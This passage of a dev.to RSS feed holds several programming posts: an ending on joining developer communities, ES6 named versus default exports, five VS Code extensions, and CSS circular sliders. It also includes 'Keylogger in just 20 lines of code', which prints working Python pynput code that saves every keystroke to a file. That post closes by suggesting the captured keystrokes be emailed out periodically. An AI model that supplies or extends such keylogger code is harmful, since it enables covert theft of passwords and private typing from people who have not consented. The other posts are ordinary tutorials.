&lt;p&gt;Every experience I've had with these ladies has been a positive one. From their active slack communities to their numerous events, every interaction has been exceptional. The WWC website itself has so many resources. Once you're acquainted with a local chapter or have done some research on their website, I would definitely suggest joining a local chapter, if there is one in your city, or even joining a specialty slack ( They range from Front-end Development to Cloud Development).&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#techqueria" class="anchor"&gt;
  &lt;/a&gt;
  &lt;a href="https://techqueria.org/"&gt;Techqueria&lt;/a&gt;
&lt;/h4&gt;

&lt;p&gt;Techqueria is one of the most active Slacks I've been apart of. They have great channels to join, everyone is super friendly and resourceful. You can even sign up for their &lt;strong&gt;&lt;em&gt;#cafecito&lt;/em&gt;&lt;/strong&gt; channel which automatically connects you with another member in the slack every 2 weeks, encouraging you to meet other members.  &lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#get-involved-join-discussions" class="anchor"&gt;
  &lt;/a&gt;
  Get Involved: Join Discussions
&lt;/h1&gt;

&lt;p&gt;Now that you've joined a community or are on Meetup learning and meeting local devs, I would be active in that community. There are several ways to do this. You could sign up for a lightning talk in your meetup group, if it's a slack community, stay involved through discussions in the chat groups. See if there are opportunities for volunteer work in your community, or even find an open-source project to contribute to. The list goes on!&lt;/p&gt;

&lt;h1&gt;
  &lt;a href="#conclusion" class="anchor"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h1&gt;

&lt;p&gt;I hope this gave you a good idea of where to start. As always, feel free to comment below your favorite ways to connect with others. I'll also put some resources down below.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#resources" class="anchor"&gt;
  &lt;/a&gt;
  Resources
&lt;/h4&gt;

&lt;p&gt;Here are a few resources I've enjoyed this past year.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="https://www.diversifytech.co/"&gt;Diversify Tech&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.tldrnewsletter.com/?utm_source=fwd&amp;amp;utm_campaign=fe549346-f855-11ea-a3d0-06b4694bee2a"&gt;TLDR Newsletter&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.techbychoice.org/"&gt;Tech by Choice Slack&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://jumpstart.me/communities/home"&gt;Jumpstart&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="https://powertofly.com/"&gt;Power To Fly events&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>webdev</category>
      <category>career</category>
      <category>codenewbie</category>
    </item>
    <item>
      <title>Named vs. Default Exports in ES6 Modules</title>
      <author>Shane Mitchell</author>
      <pubDate>Sat, 02 Jan 2021 18:08:54 +0000</pubDate>
      <link>https://dev.to/shanesc/named-vs-default-exports-in-es6-modules-1cim</link>
      <guid>https://dev.to/shanesc/named-vs-default-exports-in-es6-modules-1cim</guid>
      <description>&lt;p&gt;JavaScript Modules using ES6 syntax have two different types of exports: &lt;strong&gt;named&lt;/strong&gt; and &lt;strong&gt;default&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;There are differences in how they are declared as well as how they are imported.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#named-exports" class="anchor"&gt;
  &lt;/a&gt;
  Named Exports
&lt;/h2&gt;

&lt;p&gt;Named exports can be used to export several variables from a module. The &lt;code&gt;export&lt;/code&gt; keyword can be used for each variable that you want to export. When importing, you use &lt;a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Destructuring_assignment"&gt;object destructuring&lt;/a&gt; to assign the exported variables. The imported variables must use the same name as the exports.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// foo.js&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;foo&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;123&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;&lt;code&gt;foo.js&lt;/code&gt; has two named exports, &lt;code&gt;foo&lt;/code&gt; and &lt;code&gt;bar&lt;/code&gt;, which can be imported from any other JavaScript file like:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// anotherComponent.js&lt;/span&gt;

&lt;span class="c1"&gt;// import the foo and bar named exports from foo.js&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./foo&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// both variables can now be used&lt;/span&gt;
&lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// logs 'foo' to the console&lt;/span&gt;
&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;bar&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt; &lt;span class="c1"&gt;// logs the number 123 to the console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;ul&gt;
&lt;li&gt;Named exports can be used to export and import several variables from a module.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;When using named exports, the imported variables must use the same name as the exported variables.&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;If you want to rename imported variables, you can use the &lt;code&gt;as&lt;/code&gt; keyword:
&lt;/li&gt;
&lt;/ul&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;  &lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="nx"&gt;myVariable&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;bar&lt;/span&gt; &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./foo&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="nx"&gt;myVariable&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// logs 'foo' to the console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;h2&gt;
  &lt;a href="#default-exports" class="anchor"&gt;
  &lt;/a&gt;
  Default Exports
&lt;/h2&gt;

&lt;p&gt;You can only have one default export in a module. You use the &lt;code&gt;default&lt;/code&gt; keyword to specify which variable is the default export. When importing default exports, any name can be used for variable assignment.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// baz.js&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;baz&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;baz&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="k"&gt;default&lt;/span&gt; &lt;span class="nx"&gt;baz&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;Now that &lt;code&gt;baz.js&lt;/code&gt; has defined its default export, any other JavaScript file can import and use the &lt;code&gt;baz&lt;/code&gt; variable by importing as so:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="c1"&gt;// anotherComponent.js&lt;/span&gt;

&lt;span class="c1"&gt;// import the default export from baz.js&lt;/span&gt;
&lt;span class="k"&gt;import&lt;/span&gt; &lt;span class="nx"&gt;bazDefault&lt;/span&gt; &lt;span class="k"&gt;from&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;./baz&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// the imported variable can now be used&lt;/span&gt;
&lt;span class="nx"&gt;bazDefault&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt; &lt;span class="c1"&gt;// logs 'baz' to the console&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;We've successfully imported &lt;code&gt;baz&lt;/code&gt; into a variable called &lt;code&gt;bazDefault&lt;/code&gt;.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;strong&gt;Each module can only have one default export&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;You define the default export using the &lt;code&gt;default&lt;/code&gt; keyword.&lt;/li&gt;
&lt;li&gt;When using default exports, we can choose any name for the variable we import into. I chose &lt;code&gt;bazDefault&lt;/code&gt;, but could have just as easily called it &lt;code&gt;baz&lt;/code&gt;, &lt;code&gt;someVariable&lt;/code&gt;, or &lt;code&gt;apples&lt;/code&gt; and it would have been perfectly valid.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#summary" class="anchor"&gt;
  &lt;/a&gt;
  Summary
&lt;/h2&gt;

&lt;p&gt;So that's it, the differences between named and default exports in ES6 and how they are used.&lt;/p&gt;

&lt;p&gt;Key points:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Modules can have several named exports, but only one default export.&lt;/li&gt;
&lt;li&gt;When importing, named exports must use the same name, while default exports can be imported to any name.&lt;/li&gt;
&lt;/ul&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Top 5 Vscode Extensions 🔥</title>
      <author>Kiran Sethumadhavan</author>
      <pubDate>Sat, 02 Jan 2021 17:30:44 +0000</pubDate>
      <link>https://dev.to/forcommunity/top-5-vscode-extensions-47lo</link>
      <guid>https://dev.to/forcommunity/top-5-vscode-extensions-47lo</guid>
      <description>&lt;p&gt;There are more than thousands of Vscode Extension available in Vscode marketplace ,most of them are useful .These are the top 5 Vscode extension available in Vscode Marketplace .&lt;/p&gt;

&lt;p&gt;1 Gitlens &lt;/p&gt;

&lt;p&gt;Gitlens is one of the most  favourite and used extension by every developers in the world .It lets you check git history,  line and file history, commit searching, create or move between any branches and many other tools for handling Git.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--KEWO7JAJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/v4molwiof8hzw2bi48m8.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--KEWO7JAJ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/v4molwiof8hzw2bi48m8.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;2 Liveshare  &lt;/p&gt;

&lt;p&gt;Liveshare helps to share your entire code with another Developer and helps them to share terminal and server .A new upgraded extension is also available Liveshare with Audio where you can also communicate during the collaborative session&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--iR8nogOM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/bonidx2yq7dj0kex7wjy.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--iR8nogOM--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/bonidx2yq7dj0kex7wjy.jpg" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;3 Prettier &lt;/p&gt;

&lt;p&gt;This is the best extension available in the Vscode Marketplace for code formatting .It helps to look your code more structured and organised &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ohlRdTtZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/km6t3vhgsq9i60iaxkgv.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ohlRdTtZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/km6t3vhgsq9i60iaxkgv.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;4 Bracket Pair colorizer&lt;/p&gt;

&lt;p&gt;This extension allows matching brackets to be identified with colours. The user can define which characters to match, and which colours to use. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--d00K3wdq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/rwuje7ya4b6j2waxkdkp.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--d00K3wdq--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/rwuje7ya4b6j2waxkdkp.gif" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;5 Eslint &lt;/p&gt;

&lt;p&gt;ESLint is designed to be completely configurable, meaning you can turn off every rule and run only with basic syntax validation, or mix and match the bundled rules and your custom rules to make ESLint perfect for your project. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--9CfylNJ_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/01u8u2hmqjay06bin9pz.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--9CfylNJ_--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/01u8u2hmqjay06bin9pz.png" alt="Alt Text"&gt;&lt;/a&gt;&lt;/p&gt;

</description>
      <category>vscode</category>
      <category>devops</category>
      <category>react</category>
      <category>productivity</category>
    </item>
    <item>
      <title>Keylogger in just 20 lines of code</title>
      <author>ablil</author>
      <pubDate>Sat, 02 Jan 2021 17:28:36 +0000</pubDate>
      <link>https://dev.to/ablil/keylogger-in-just-20-lines-of-code-6kk</link>
      <guid>https://dev.to/ablil/keylogger-in-just-20-lines-of-code-6kk</guid>
      <description>&lt;p&gt;I am sure you have already heard the term &lt;strong&gt;keylogger&lt;/strong&gt; since you're a geek and you're visiting this website.&lt;/p&gt;

&lt;p&gt;If you don’t know, let me explain very quickly, a Keylogger as its name indicates, is a &lt;em&gt;tool that captures your keystroke&lt;/em&gt;* and saves them somewhere.&lt;/p&gt;

&lt;p&gt;If you're a pentester, I am sure you have such tools in your bag 💻.&lt;/p&gt;

&lt;p&gt;We are using &lt;strong&gt;python&lt;/strong&gt; as a scripting language and &lt;strong&gt;pynput&lt;/strong&gt; library to capture keyboard events.&lt;/p&gt;

&lt;p&gt;Here is the full code, exactly 20 lines, the code explains itself.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight python"&gt;&lt;code&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Keylogger&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                                          
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                                   
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogs&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'/tmp/keylogs.logs'&lt;/span&gt;                                                
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogs&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;'a+'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                       

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                              
        &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                                              
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;char&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                              
        &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="nb"&gt;AttributeError&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                            
            &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                                        
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;'Key.enter'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                
                &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;'&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s"&gt;'&lt;/span&gt;                                                        
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s"&gt;'Key.space'&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                                                
                &lt;span class="n"&gt;special_key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;' '&lt;/span&gt;                                                         
            &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;write&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;special_key&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;                                           

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;run&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                                        
        &lt;span class="k"&gt;with&lt;/span&gt; &lt;span class="n"&gt;keyboard&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Listener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;on_press&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;callback&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="k"&gt;as&lt;/span&gt; &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;                       
            &lt;span class="n"&gt;l&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;                                                               

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;stop&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;                                                                       
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;keylogsfile&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="n"&gt;close&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;div class="highlight__panel js-actions-panel"&gt;
&lt;div class="highlight__panel-action js-fullscreen-code-action"&gt;
    Enter fullscreen mode
    


    Exit fullscreen mode
    


&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;



&lt;p&gt;If you have time, you could extend this code to send captured keystrokes via email periodically 😉&lt;/p&gt;

</description>
      <category>python</category>
      <category>hacking</category>
      <category>penteseting</category>
    </item>
    <item>
      <title>Accessible Circular Sliders</title>
      <author>Mads Stoumann</author>
      <pubDate>Sat, 02 Jan 2021 16:45:39 +0000</pubDate>
      <link>https://dev.to/madsstoumann/accessible-circular-sliders-11p</link>
      <guid>https://dev.to/madsstoumann/accessible-circular-sliders-11p</guid>
      <description>&lt;p&gt;Just a few years ago, it was almost impossible to create range sliders without &lt;em&gt;a lot&lt;/em&gt; of JavaScript. Thankfully, in modern browsers, it's super-easy to style range sliders, using CSS only. If the browser supports &lt;em&gt;CSS Custom Properties&lt;/em&gt;, it's even possible to use the same styles for a wide range of different styles, just by updating a few properties.&lt;/p&gt;

&lt;p&gt;I created these sliders recently, using only CSS:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--dcLJx0B8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/g2vuni0i6ngt8jnlzip4.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--dcLJx0B8--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/g2vuni0i6ngt8jnlzip4.png" alt="Range Sliders"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;JavaScript is only used to set the &lt;code&gt;value&lt;/code&gt; of the slider as a &lt;em&gt;custom property&lt;/em&gt;, that then is used in a CSS &lt;code&gt;linear-gradient&lt;/code&gt; to create the "fill".&lt;/p&gt;

&lt;p&gt;Accessibility is "built-in": you can &lt;code&gt;:focus&lt;/code&gt;, and use &lt;code&gt;arrow&lt;/code&gt;-keys for navigation.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#but-what-about-circular-sliders" class="anchor"&gt;
  &lt;/a&gt;
  But what about &lt;em&gt;Circular Sliders?&lt;/em&gt;
&lt;/h2&gt;

&lt;p&gt;I've always had a soft spot for circular sliders — don't know why, really. So I tried to style the &lt;code&gt;&amp;lt;input type="range" /&amp;gt;&lt;/code&gt; as a circle, and the &lt;code&gt;thumb&lt;/code&gt;-shadow-element as a draggable, smaller circle.&lt;/p&gt;

&lt;p&gt;Visually, it was possible using only CSS:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--GsazVfwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/a4r7yl2hv1fjemlsxbwo.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--GsazVfwB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/i/a4r7yl2hv1fjemlsxbwo.png" alt="Circular Range"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;But the movement of the thumb-circle was still &lt;em&gt;horizontal&lt;/em&gt;. &lt;br&gt;
I then tried to update a custom property with the &lt;code&gt;value&lt;/code&gt; of the &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt;, and used that in a &lt;code&gt;transform&lt;/code&gt;, rotating the &lt;code&gt;track&lt;/code&gt; of the &lt;code&gt;&amp;lt;input&amp;gt;&lt;/code&gt; and a negative &lt;code&gt;margin-left&lt;/code&gt; to position the thumb.&lt;/p&gt;

&lt;p&gt;But, alas, although it &lt;em&gt;was&lt;/em&gt; possible to move the thumb along the edges of the circle using arrow-keys, it didn't really work using pointer-devices.&lt;/p&gt;

&lt;p&gt;So in the end, I had to call my father, a retired maths teacher, to brush up my trigonometry and understanding of arctangents, in order to create these accessible, circular sliders:&lt;/p&gt;

&lt;p&gt;&lt;iframe height="600" src="https://codepen.io/stoumann/embed/mdrEEMw?height=600&amp;amp;default-tab=result&amp;amp;embed-version=2"&gt;
&lt;/iframe&gt;
&lt;/p&gt;

&lt;p&gt;They are &lt;code&gt;:focus&lt;/code&gt;'able, and use the same &lt;code&gt;arrow&lt;/code&gt;-keys as regular range-sliders. The &lt;code&gt;fill&lt;/code&gt; is a CSS &lt;code&gt;conic-gradient&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Thanks for reading!&lt;/p&gt;

</description>
      <category>css</category>
      <category>javascript</category>
      <category>a11y</category>
      <category>codepen</category>
    </item>
  </channel>
</rss>
